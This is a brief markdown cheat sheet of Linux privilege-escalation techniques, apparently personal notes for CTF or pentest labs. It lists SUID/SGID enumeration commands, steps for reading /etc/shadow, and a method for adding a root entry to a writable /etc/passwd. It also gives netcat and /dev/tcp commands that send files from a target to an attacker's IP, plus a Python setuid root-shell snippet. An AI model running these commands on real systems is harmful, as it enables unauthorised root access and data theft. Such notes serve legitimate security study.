# privilege Escalation

* id
* look into every available folder
* search in /home
* check every user's home directory.
* look into /etc/hosts
* use `locate flag`; you may find it.
* `netstat -ulnp`, `netstat  -nltp`
* `sudo -l` to know what you can run with sudo privileges.
* use `mktemp -d` to make a folder in /temp.
* if already rooted, you could be in a docker; if there is a `.dockerevn` you are in a docker.
* check /etc/shadow.
* check /etc/passwd to see if it's writable.
  * use `openssl passwd` to create a hash for a string (password):
    `root:<hash>:0:0:root:/root:/bin/bash`
  then `su -l root`, entering the string, we are in.

* enumerating suid binaries:
 `find / -perm -u=s -type f 2>/dev/null` or
 `find / -type f -perm -4000 2>/dev/null`
  * only owned by root:
  `find / -type f -perm -u=s -user root -ls 2>/dev/null`

* enumerating sgid binaries:

`find / -type f -perm -2000 2>/dev/null
find / -type f -perm -g=s 2>/dev/null
`

* check processes: `ps -aux`

* found something interesting?: `file <thefile>` for more info.

* `Ltrace`: Ltrace is essentially a command that runs another binary and
sees what libraries are called.

* use linpeas

## use `netcat` to move files;

  run the server on the attack machine. `nc -lvn <attackPort> > <fileName>`
  then on target:`cat /usr/bin/reset_root > /dev/tcp/<attackIP>/<attackPort>`
  * listening for incoming file: `nc -l <port> > <file_name>`
    * `>` saves the received contents to the file.
  * sending file: `nc <IP> <port> < <file_name>`
    * `<` sends to the connection.

send file from target to attack:

target: `cat <file_name> > /dev/tcp/<attack_ip>/<attack_port`
attack: `nc -l <port>`



* `/usr/bin/newgrp; /bin/sh`

# get shell

in python:
`
import os
os.setuid(0)
os.system("/bin/bash")
`
